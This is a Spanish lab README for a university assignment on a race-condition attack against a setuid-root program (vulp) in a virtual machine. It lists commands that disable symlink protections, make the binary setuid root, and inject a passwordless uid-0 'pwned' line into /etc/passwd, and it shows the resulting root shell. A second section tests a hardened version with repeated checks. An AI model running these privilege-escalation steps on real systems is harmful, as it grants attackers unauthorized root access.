# RaceConditionTEC

Tarea de condiciones de carrera

# Requisitos

- Ubuntu (24.10) en ARM
- vMWare Fusion o similar

# Pasos iniciales

1. Pasar archivos voip a la maquina virtual

```
# Servidor de archivos en macOS de atacante
python3 -m http.server 80

# Traer los archivos desde la maquina virtual
curl http://IP/vulp.c -o vulp.c
curl http://IP/vulp_repetition.c -o vulp_repetition.c
curl http://IP/vulp_seteuid.c -o vulp_seteuid.c
curl http://IP/looper.sh -o looper.sh
```

2. Eliminar protecciones de seguridad de symlinks para efectos de la tarea

```
# Esto parece restablecerse siempre por lo que es mejor ejecutarlo cada vez que se inicia la VM
sudo sysctl -w fs.protected_symlinks=0
sudo sysctl fs.protected_regular=0
```

3. Compilar el programa `vulp.c`, `firegoblin.c` y asignar permisos de setuid de root

```
# Mismo proceso para todos los vulp*.c
gcc vulp.c -o vulp -lm
sudo chown root vulp
sudo chmod 4755 vulp

gcc firegoblin.c -o firegoblin
```

# Trabajo 1

Agregar entrada a `/etc/shadow` y `/etc/password` para un nuevo usuario root mediante un ataque al programa vulp.

1. Agregar nuevo usuario como prueba de como se agrega en `/etc/shadow` y `/etc/password`

```
# useradd pwned -m -G sudo
# passwd pwned

# cat /etc/shadow
pwned:$y$j9T$yb7F48eurkR2ZugVrkr4U/$TkSO.sGjtjyki/IlF018wo6kw7zd4nUUrhE9emRNb7C:20237:0:99999:7:::

# cat /etc/passwd
pwned:x:1001:1001::/home/pwned:/bin/sh
```

Es necesario para el ataque que este se asemeje a root y tenga los valores de 0 en `/etc/passwd`

Por lo que debería verse asi:

```
# cat /etc/passwd
pwned:$y$j9T$yb7F48eurkR2ZugVrkr4U/$TkSO.sGjtjyki/IlF018wo6kw7zd4nUUrhE9emRNb7C:0:0:pwned:/root:/bin/bash
```

No es necesario editar `/etc/shadow`, ya que es posible realizar una entrada en `/etc/passwd`
por medio de utilizar un hash como contraseña, una manera de hacerlo es creando un usuario
y copiándolo el valor por medio de `/etc/shadow`.
Porque se tiene la contraseña en lugar de "x" es posible
no tener que modificar ambos.

2. Ejecutar el ataque

Es necesario ejecutar el ataque por medio de un loop, ya que al ser un ataque de condición de carrera,
tiene que correrse en paralelo multiples veces hasta encontrar el exito.

```
$ ./firegoblin

// En otra terminal
$ chmod +x looper.sh
$ ./looper.sh 
```

A cierto momento se debería recibir el mensaje de exito en la terminal de looper
y se debería poder acceder al usuario creado y verificar que es root.

```
$ ./looper.sh 
PWNED :). El archivo /etc/passwd tiene que haber sido modificado.
$ su pwned
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /etc/passwd
pwned::0:0:pwned:/root:/bin/bash
```

## Mejora de la tasa de exito

Se redujo el valor de delay a 0 para comprobar si existe problemas para explotar la vulnerabilidad.
Se determinó que todavía se puede ejecutar la vulnerabilidad sin problema alguno y sin una perdida
en la tasa de exito, esto, dado al uso de la función `renameat2`, que previene condiciones de carrera en
el script atacante firegoblin.c.

# Trabajo 2

Se realiza una modificación del programa `vulp.c` y se crea `vulp_repetition.c` que valida y abre el mismo archivo
varias veces con el fin de determinar si todos son el mismo archivo o no y ejecutar la concatenation de los caracteres
enviados.

Esto tiene el fin de hacer más difícil que se haga el ataque al tener que sobrepasar varias de estas pruebas. Para este
efecto se realizaron cuatro cadenas de verificación.

```
$ ./firegoblin

# En otra terminal (se modifica looper.sh para que use vulp_repetition)
$ ./looper.sh
b./looper.sh: line 14: 34543 Done                    echo 'pwned::0:0:pwned:/root:/bin/bash'
     34544 Segmentation fault      (core dumped) | ./vulp_repetition
No permission fp3 
No permission fp4 
./looper.sh: line 14: 34552 Done                    echo 'pwned::0:0:pwned:/root:/bin/bash'
     34553 Segmentation fault      (core dumped) | ./vulp_repetition
No permission fp2 
Existe algun file descriptor invalido 
Los file descriptors no apuntan al mismo archivo 
No permission fp 
No permission fp3 
No permission fp4 

```

En suma, se dejó el programa `looper.sh` corriendo durante un tiempo y no se obtuvieron los resultados anteriormente
vistos, no fue posible realizar el ataque y el script menciona que no existen los permisos para abrir el archivo tanto a
nivel de la función `access` como en `fopen`.

Al bajar el nivel a solo dos verificaciones en lugar de 4,
si se pudo lograr modificar el archivo pero con una tasa de éxito un poco menor.